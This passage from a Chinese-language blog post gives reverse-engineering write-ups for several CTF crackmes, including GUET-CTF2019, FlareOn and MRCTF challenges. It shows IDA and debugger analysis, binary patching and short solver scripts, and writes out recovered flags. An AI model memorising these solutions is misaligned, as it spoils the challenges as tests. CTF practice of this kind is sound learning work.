class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">f2[i] -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">strcat</span>(flag, f1);</span><br><span class="line"><span class="built_in">strcat</span>(flag, f2);</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="GUET-CTF2019-number-game"><a href="#GUET-CTF2019-number-game" class="headerlink" title="[GUET-CTF2019]number_game"></a>[GUET-CTF2019]number_game</h1><h2 id="关键词：数独"><a href="#关键词：数独" class="headerlink" title="关键词：数独"></a>关键词：数独</h2><p>拿到这个题，解压下来是个64位的elf文件如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304225444.png" alt="[GUET-CTF2019]number_game001"></p><p>拖入ida查看，sub_4006D6()函数是验证用户输入长度和字符范围。</p><p>判断条件的sub_400917()函数，看得出来是5*5数独游戏但这个数独游戏只要求行和列的元素不相同即可，如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304225500.png" alt="[GUET-CTF2019]number_game003"></p><p>sub_400881(v7)函数，这就是个赋值函数，把v7的10个数赋值到byte_601062 … byte_601077：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304225515.png" alt="[GUET-CTF2019]number_game004"></p><p>我们来看看这个数独：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304225647.png" alt="[GUET-CTF2019]number_game005"></p><p>就是将下面为#号的替换为v7中的数值，我将其写了下来如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 4 # 2 3</span><br><span class="line">3 0 # 1 #</span><br><span class="line">0 # 2 3 #</span><br><span class="line"># 3 # # 0</span><br><span class="line">4 2 # # 1</span><br></pre></td></tr></table></figure><p>解出来的#当中填入的10个数为：<strong>0,4,2,1,4,2,1,4,3,0</strong></p><p>由于sub_400881(v7)函数和sub_400807(v4,v7)函数当中有递归，静态分析起来稍显麻烦，我们直接动态调试</p><p>输入0123456789</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304225722.png" alt="[GUET-CTF2019]number_game006"></p><p>注意，当循环到5的时候，在这个位置我们需要修改ZF标志位（因为只允许输入0-4），所以之后的5-9的循环都要修改ZF标志位。</p><p>然后直接F8跳过两个递归函数，双击查看v7当中的数据：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304225738.png" alt="[GUET-CTF2019]number_game007"></p><p>整理一下，一一对应关系为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 1 2 3 4 5 6 7 8 9    &#x2F;&#x2F;测试输入的数字</span><br><span class="line">7 3 8 1 9 4 0 5 2 6    &#x2F;&#x2F;测试得到与输入对应的数字</span><br><span class="line">0 4 2 1 4 2 1 4 3 0    &#x2F;&#x2F;本应该填入数独的数字</span><br></pre></td></tr></table></figure><p>我们之前得到应该填入数独的数字为：<strong>0,4,2,1,4,2,1,4,3,0</strong></p><h2 id="脚本-7"><a href="#脚本-7" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> arr[] = &#123; <span class="number">48</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">48</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> table[] = &#123; <span class="number">7</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">11</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">flag[table[i]] = arr[i];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;flag&#123;&quot;</span> &lt;&lt;flag &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304225904.png" alt="[GUET-CTF2019]number_game008"></p><h1 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h1><h2 id="关键词：html"><a href="#关键词：html" class="headerlink" title="关键词：html"></a>关键词：html</h2><p>解压过后是一个html文件和一个写了没啥用的hint的txt文件，</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230048.png" alt="[FlareOn4]login001"></p><p>打开html文件发现让我们输入flag然后验证flag输入是否正确。</p><p>f12查看源码:</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230113.png" alt="[FlareOn4]login002"></p><p>函数逻辑很简单，字母前十三位和后十三位交换。</p><h2 id="脚本-8"><a href="#脚本-8" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[] = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((str[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str[i] &lt; <span class="string">&#x27;a&#x27;</span> + <span class="number">13</span>) || (str[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; str[i] &lt; <span class="string">&#x27;A&#x27;</span> + <span class="number">13</span>))</span><br><span class="line">            str[i] += <span class="number">13</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((str[i] &gt;= <span class="string">&#x27;a&#x27;</span> + <span class="number">13</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;z&#x27;</span>) || (str[i] &gt;= <span class="string">&#x27;A&#x27;</span> + <span class="number">13</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            str[i] -= <span class="number">13</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;%s&#125;&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230203.png" alt="[FlareOn4]login003"></p><h1 id="MRCTF2020-EasyCpp"><a href="#MRCTF2020-EasyCpp" class="headerlink" title="[MRCTF2020]EasyCpp"></a>[MRCTF2020]EasyCpp</h1><h2 id="关键词：C"><a href="#关键词：C" class="headerlink" title="关键词：C++"></a>关键词：C++</h2><p>下载下来是个C++写的elf文件，好久没做过C++的题目了，说实话以前没有学习C++的时候，C++的题，密密麻麻的，挺劝退人的，</p><p>但现在会一些C++语法了再来看看，其实也还好啦。</p><p>拖入ida，搜索字符串，看到如下关键字符串，</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230305.png" alt="[MRCTF2020]EasyCpp001"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230318.png" alt="[MRCTF2020]EasyCpp002"></p><p>随便找个字符串X交叉引用来到主函数，f5查看反汇编代码：密密麻麻的，各种作用域，但是大部分可以直接忽略</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230338.png" alt="[MRCTF2020]EasyCpp003"></p><p>上面那幅图都是经过我分析过后的，各个关键点。</p><p>接下来我们来慢慢的，一点一点的分析整个流程的逻辑：</p><p>首先来到如下代码处，cin即是C++当中的输入，这里可以看出，我们需要输入9个key，然后to_string将其转化为字符。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230357.png" alt="[MRCTF2020]EasyCpp004"></p><p>从这里可以看到，此处将我们的key一个一个的存入了vector容器，vector容器其实就是数组。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230421.png" alt="[MRCTF2020]EasyCpp005"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230439.png" alt="[MRCTF2020]EasyCpp006"></p><p>关键函数1：双击lambda这个匿名函数，在最深处发现这个函数的作用是让每个字符与1异或。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230459.png" alt="[MRCTF2020]EasyCpp007"></p><p>关键函数2：这个depart函数是最主要的逻辑函数，当中存在着递归，很劝退人，慢慢分析，其实就是将一个数分解成几个相乘可以得到那个数的函数，就是数的分解，然后每个素数转换成字符串，再拼接在一起。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230520.png" alt="[MRCTF2020]EasyCpp008"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230532.png" alt="[MRCTF2020]EasyCpp009"></p><p>关键函数3：这个函数的作用就很简单了，点进去一目了然，就是替换字符串。如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230556.png" alt="[MRCTF2020]EasyCpp010"></p><p>关键函数4：判断，但是我没有找个具体和哪个字符串比较，但是说实话，题做多了，看到之前字符串窗口下面那几个字符串就敏感了，十有八九就是和那几个字符串比较，而且翻上去看看，可以看到是9个字符串，这进一步验证了自己的想法。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230617.png" alt="[MRCTF2020]EasyCpp011"></p><h2 id="脚本-9"><a href="#脚本-9" class="headerlink" title="脚本"></a>脚本</h2><p>python写出脚本如下（写C++实在是有些麻烦）：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230658.png" alt="[MRCTF2020]EasyCpp012"></p><p>最后将得到的字符串拿去md5在线加密，加密方式是32位大写</p><p>得到flag</p><h1 id="findKey"><a href="#findKey" class="headerlink" title="findKey"></a>findKey</h1><h2 id="关键词：花指令-md5"><a href="#关键词：花指令-md5" class="headerlink" title="关键词：花指令 md5"></a>关键词：花指令 md5</h2><p>下载下来一个exe文件，运行如下，名字叫findKey，这名字刚开始给人感觉说实话有点像Misc的题，查壳无壳。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230858.png" alt="findKey001"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230907.png" alt="findKey002"></p><p>拖入ida当中，f5， f5不出来，然后shift + f12查找字符串，说实话下图框出来的字符串都很可疑，先去flag{}字符串看看。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230920.png" alt="findKey003"></p><p>此处按X查看交叉引用。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304230941.png" alt="findKey004"></p><p>来到此区域，地址显红，说明ida没有将函数解析出来，网上有人说是有花指令（地址显红，也确实有可能），然后还说去上面的两个push删掉下面那个push，但是一删就导致堆栈不平衡，然后还去补堆栈？？？？？push push ret这确实是一种花指令，但是我不明白这个题目这里算不算，好吧我也确实就掉进坑里面去了，折腾了一两个小时，这是好事，在坑里学到了一些东西（常见花指令，修补平衡堆栈，地址显红，p等）。</p><p>后来发现，其实不用这么麻烦，直接将整个红色地址区域都选上然后按快捷键p键重构函数，可以成功重构出来函数，然后f5</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231504.png" alt="findKey005"></p><p>这就是主要的那个函数了，sub_401005函数就是关键函数，</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231519.png" alt="findKey006"></p><p>进入sub_401005函数，函数逻辑如下：只是一个异或，然后得出来的字符串c8837b23ff8aaa8a2dde915473ce0991是md5加密</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231537.png" alt="findKey007"></p><p>解密过后为123321</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231555.png" alt="findKey008"></p><h2 id="脚本-10"><a href="#脚本-10" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//0kk`d1a`55k222k2a776jbfgd`06cjjb</span></span><br><span class="line">    <span class="keyword">int</span> table1[] = &#123; <span class="number">48</span>,  <span class="number">107</span>, <span class="number">107</span>,  <span class="number">96</span>, <span class="number">100</span>,  <span class="number">49</span>,  <span class="number">97</span>,  <span class="number">96</span>,  <span class="number">53</span>,  <span class="number">53</span>,</span><br><span class="line">                  <span class="number">107</span>,  <span class="number">50</span>,  <span class="number">50</span>,  <span class="number">50</span>, <span class="number">107</span>,  <span class="number">50</span>,  <span class="number">97</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">54</span>,</span><br><span class="line">                  <span class="number">106</span>,  <span class="number">98</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">100</span>,  <span class="number">96</span>,  <span class="number">48</span>,  <span class="number">54</span>,  <span class="number">99</span>, <span class="number">106</span>,</span><br><span class="line">                  <span class="number">106</span>,  <span class="number">98</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SS</span></span><br><span class="line">    <span class="keyword">int</span> SS[] = &#123; <span class="number">83</span>,<span class="number">83</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)    table1[i] ^= SS[i % <span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)    <span class="built_in">cout</span> &lt;&lt; (<span class="keyword">char</span>)table1[i];</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> table2[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">87</span>,  <span class="number">94</span>,  <span class="number">82</span>,  <span class="number">84</span>,  <span class="number">73</span>,  <span class="number">95</span>,   <span class="number">1</span>, <span class="number">109</span>, <span class="number">105</span>,  <span class="number">70</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">110</span>,  <span class="number">95</span>,   <span class="number">2</span>, <span class="number">108</span>,  <span class="number">87</span>,  <span class="number">91</span>,  <span class="number">84</span>,  <span class="number">76</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//上面得到的字符串是md5加密过后的，网上找到md5解密工具解出来是123321</span></span><br><span class="line"><span class="keyword">int</span> ret[] = &#123; <span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">49</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++)table2[i] ^= ret[i % <span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++)<span class="built_in">cout</span> &lt;&lt; (<span class="keyword">char</span>)table2[i];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231618.png" alt="findKey009"></p><h1 id="FlareOn3-Challenge1"><a href="#FlareOn3-Challenge1" class="headerlink" title="[FlareOn3]Challenge1"></a>[FlareOn3]Challenge1</h1><h2 id="关键词：base64换表"><a href="#关键词：base64换表" class="headerlink" title="关键词：base64换表"></a>关键词：base64换表</h2><p>解压出来一个exe文件和一个txt文件</p><p>运行如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231824.png" alt="[FlareOn3]Challenge1001"></p><p>拖入ida，查找字符串，发现下面这些可以利用的字符串</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231843.png" alt="[FlareOn3]Challenge1002"></p><p>看到这个字符串，不用说，有base64换表操作</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231859.png" alt="[FlareOn3]Challenge1003"></p><p>进入main函数，代码逻辑很简单，就是sub_401260函数将输入的字符串处理，然后与v6进行对比，相等就输出Correct!</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232005.png" alt="[FlareOn3]Challenge1004"></p><p>进入sub_401260，发现就是一个base64加密，不过换了表。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304231955.png" alt="[FlareOn3]Challenge1005"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232030.png" alt="[FlareOn3]Challenge1006"></p><h2 id="脚本-11"><a href="#脚本-11" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">table1 = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line">table2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#   maketrans() 用于创建字符映射的转换表</span></span><br><span class="line"><span class="comment">#   translate() 使用指定的翻译映射表对字符串执行替换</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(table1,table2)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232117.png" alt="[FlareOn3]Challenge1007"></p><p>补充：</p><p>Python 的translate() 方法通常是配合着maketrans()方法使用</p><p>先按照转换表的替换出新的 string，然后再执行 del 参数的替换，有个先后顺序:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> maketrans</span><br><span class="line"></span><br><span class="line">intab = <span class="string">&#x27;aeiou&#x27;</span></span><br><span class="line">outtab = <span class="string">&#x27;12345&#x27;</span></span><br><span class="line">str1 = <span class="string">&#x27;i am a example string for test! wow...!!!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;str1:&quot;</span>,str1</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;intab:&quot;</span>,intab</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;outtab:&quot;</span>,outtab</span><br><span class="line"></span><br><span class="line">transtab = maketrans(intab,outtab)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;str1.translate(translate(intab,outtab)):&quot;</span></span><br><span class="line"><span class="built_in">print</span> str1.translate(transtab)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;str1.translate(translate(intab,outtab),&#x27;x1&#x27;):&quot;</span></span><br><span class="line"><span class="built_in">print</span> str1.translate(transtab,<span class="string">&#x27;x1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><blockquote><p>str1: i am a example string for test! wow…!!! intab: aeiou outtab: 12345 str1.translate(translate(intab,outtab)): 3 1m 1 2x1mpl2 str3ng f4r t2st! w4w…!!! str1.translate(translate(intab,outtab),’x1’): 3 1m 1 21mpl2 str3ng f4r t2st! w4w…!!!</p></blockquote><h1 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h1><h2 id="关键词：栈回溯"><a href="#关键词：栈回溯" class="headerlink" title="关键词：栈回溯"></a>关键词：栈回溯</h2><p>解压出来一个exe文件和一个没啥用的txt文件，运行如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232322.png" alt="[FlareOn6]Overlong001"></p><p>查壳，无壳，或者说，查不出来壳？</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232348.png" alt="[FlareOn6]Overlong002"></p><p>拖入ida，很简单，内容很少，字符串也搜索不出来，这不得不让我怀疑这程序是否加了壳。先不管，先看看start函数再说。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232401.png" alt="[FlareOn6]Overlong003"></p><p>start函数如下，就是一个弹窗，而sub_4010060函数得到显示的字符串</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232415.png" alt="[FlareOn6]Overlong004"></p><p>进入sub_4010060函数，当中内容也很简单，就是显示字符串，而这28也恰好吻合弹窗当中的字符串“I never broke the encoding: ”的长度</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232428.png" alt="[FlareOn6]Overlong005"></p><p>但令人疑惑的是：unk_402008的长度为0xAF,这意味着flag很有可能就在后面，我们只需要把判断的28改成0xaf，让其全部显示出来即可。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232441.png" alt="[FlareOn6]Overlong006"></p><p>拖入OD，应对这种搜索不出来字符串的弹窗程序，<strong>堆栈回溯法</strong> 是个很不错的选择。</p><p>我这里说说栈回溯法的步骤：直接运行程序，最后不点击确定，然后再在od里面将程序暂停，alt+k查看堆栈调用，由于有弹窗，我们肯定是可以在堆栈调用里面看到MessageBox函数调用的，然后右键查看调用，然后再在调用函数的领空查看返回的地址，我们便可以到达目标代码领空。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232456.png" alt="[FlareOn6]Overlong007"></p><p>来到关键代码的领空，在此区域，我们可以看到两个call，一个是MessagBoxA函数，那么另外一个肯定就是得到字符串的函数了，而且这个函数压入了三个参数，第一个参数便是0x1C，其实这个函数也就是我们上面的sub_4010060函数。函数调用约定为_stdcall,ida当中显示也确实如此。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232510.png" alt="[FlareOn6]Overlong008"></p><p>现在我们就要来修改代码，直接将push 0x1C修改成push 0xAF是不行的，这会将下面的指令覆盖，所以我们的选择是，jmp到空旷的代码区域，修改过后在jmp回来。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232526.png" alt="[FlareOn6]Overlong009"></p><p>运行得到<strong>flag{I<a href="mailto:&#95;&#x61;&#95;&#x4d;&#95;&#x74;&#95;&#x68;&#95;&#101;&#x5f;&#101;&#x5f;&#110;&#95;&#x43;&#95;&#x6f;&#x5f;&#x44;&#x5f;&#105;&#95;&#110;&#95;&#x67;&#64;&#x66;&#x6c;&#97;&#x72;&#101;&#45;&#x6f;&#110;&#x2e;&#x63;&#x6f;&#x6d;">&#95;&#x61;&#95;&#x4d;&#95;&#x74;&#95;&#x68;&#95;&#101;&#x5f;&#101;&#x5f;&#110;&#95;&#x43;&#95;&#x6f;&#x5f;&#x44;&#x5f;&#105;&#95;&#110;&#95;&#x67;&#64;&#x66;&#x6c;&#97;&#x72;&#101;&#45;&#x6f;&#110;&#x2e;&#x63;&#x6f;&#x6d;</a>}</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232605.png" alt="[FlareOn6]Overlong0010"></p><h1 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h1><h2 id="关键词：upx-z3约束求解器"><a href="#关键词：upx-z3约束求解器" class="headerlink" title="关键词：upx z3约束求解器"></a>关键词：upx z3约束求解器</h2><p>查壳，upx壳</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232701.png" alt="[GUET-CTF2019]re001"></p><p>脱壳</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232715.png" alt="[GUET-CTF2019]re002"></p><p>拖入ida，通过字符串定位关键函数</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232728.png" alt="[GUET-CTF2019]re003"></p><p>发现关键函数sub_4009AE，进入该函数</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232741.png" alt="[GUET-CTF2019]re004"></p><h2 id="脚本-12"><a href="#脚本-12" class="headerlink" title="脚本"></a>脚本</h2><p>逆向相除得到flag</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">int</span>&gt; a = &#123; <span class="number">166163712</span>, <span class="number">731332800</span> ,<span class="number">357245568</span> ,<span class="number">1074393000</span>,<span class="number">489211344</span>,<span class="number">518971936</span>,</span><br><span class="line"> <span class="number">406741500</span>,<span class="number">294236496</span>, <span class="number">177305856</span> ,<span class="number">650683500</span> ,<span class="number">298351053</span> ,<span class="number">386348487</span> ,<span class="number">438258597</span> ,<span class="number">249527520</span> ,</span><br><span class="line"> <span class="number">445362764</span> ,<span class="number">174988800</span>,<span class="number">981182160</span>,<span class="number">493042704</span>,<span class="number">257493600</span>,<span class="number">767478780</span>,<span class="number">312840624</span>,<span class="number">1404511500</span>,</span><br><span class="line"> <span class="number">316139670</span>,<span class="number">619005024</span>,<span class="number">372641472</span>,<span class="number">373693320</span>,<span class="number">498266640</span>,<span class="number">452465676</span>,<span class="number">208422720</span>,<span class="number">515592000</span>,<span class="number">719890500</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">int</span>&gt; b = &#123; <span class="number">1629056</span> ,<span class="number">6771600</span> ,<span class="number">3682944</span> ,<span class="number">10431000</span> ,<span class="number">3977328</span> ,<span class="number">5138336</span> ,</span><br><span class="line"> ,<span class="number">5551632</span> ,<span class="number">3409728</span> ,<span class="number">13013670</span> ,<span class="number">6088797</span> ,<span class="number">7884663</span> ,<span class="number">8944053</span> ,<span class="number">5198490</span> ,<span class="number">4544518</span> ,<span class="number">3645600</span> ,</span><br><span class="line"> <span class="number">10115280</span> ,<span class="number">9667504</span> ,<span class="number">5364450</span> ,<span class="number">13464540</span>,<span class="number">5488432</span>,<span class="number">14479500</span>,<span class="number">6451830</span>,<span class="number">6252576</span>,<span class="number">7763364</span>,</span><br><span class="line"> <span class="number">7327320</span>,<span class="number">8741520</span>,<span class="number">8871876</span>,<span class="number">4086720</span>,<span class="number">9374400</span>,<span class="number">5759124</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> c[<span class="number">31</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span 